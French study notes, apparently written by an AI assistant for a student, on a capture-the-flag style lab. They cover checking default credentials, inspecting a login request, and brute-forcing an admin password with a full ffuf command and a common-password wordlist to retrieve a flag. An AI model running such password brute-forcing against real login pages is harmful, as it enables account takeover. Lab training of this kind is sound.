Parfait 👍 je t’ai remis ça **propre pour Obsidian**, structuré, lisible et aligné — sans changer ton contenu ✅

***

# 🧠 IP et DNS donné

👉 Tu as testé :

```
admin / admin
admin / password
admin / 123456
```

👉 ✅ Rien ne marche  
➡️ Donc :

```
❌ Pas de credentials par défaut
✅ Il faut passer au brute-force (ffuf)
```

***

# 🌐 1. Ajouter le domaine

```bash
sudo vim /etc/hosts
```

👉 Ajouter à la fin :

```
IP domaine
```

👉 Exemple :

```
10.10.10.5 academy.htb
```

***

# 🧩 ✅ ÉTAPE SUIVANTE — Analyse du login (TRÈS IMPORTANT)

👉 Avant ffuf, tu dois comprendre **comment fonctionne le login**

***

## ✅ 1. Observer le formulaire

👉 Quand tu te connectes :

* reste sur la même page ?
* redirection ?
* message d’erreur ?

***

## ✅ 2. Ouvrir DevTools (F12 → Network)

👉 Faire une tentative avec :

```
admin / test
```

***

# ✅ 📍 Ce que tu as trouvé

```
POST /login
HTTP/1.1 401 UNAUTHORIZED
```

***

## 🧠 Interprétation

* ✔️ 401 = **échec d’authentification**
* ✔️ la requête est correcte
* ✔️ seul le mot de passe est mauvais

👉 ✅ C’est EXACTEMENT le signal attendu 🎯

***

# 🚀 Lancement de FFUF

```bash
ffuf -X POST \
-u https://web-80-52-222.cod-eu-west-3.hbtn.io/login \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=admin&password=FUZZ" \
-w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

***

# 🔍 Observation des résultats

👉 Tu remarques :

* la majorité → `401 UNAUTHORIZED`
* MAIS un mot de passe a :

```
401 + taille différente ✅
```

***

# 🎯 Conclusion

👉 Même si le code = 401 :

✅ la **taille différente** indique un comportement différent

👉 donc :

```
✅ password trouvé
```

***

# 🏁 Résultat final

👉 Copier le mot de passe trouvé  
👉 se connecter avec :

```
admin / password_trouvé
```

👉 puis récupérer :

```
1-flag.txt ✅
```

***

# 🧠 Résumé simple

```
1. Test default creds ❌
2. Analyse login ✅
3. Identifier signal (401) ✅
4. FFUF sur password ✅
5. Détecter différence taille ✅
6. Login ✅
7. Récupérer flag ✅
```

***

💬 Si tu veux, je peux aussi te faire une version

* ultra condensée (cheat sheet)
* ou version révision

🔥 Tu es vraiment en train de monter en niveau là 👍
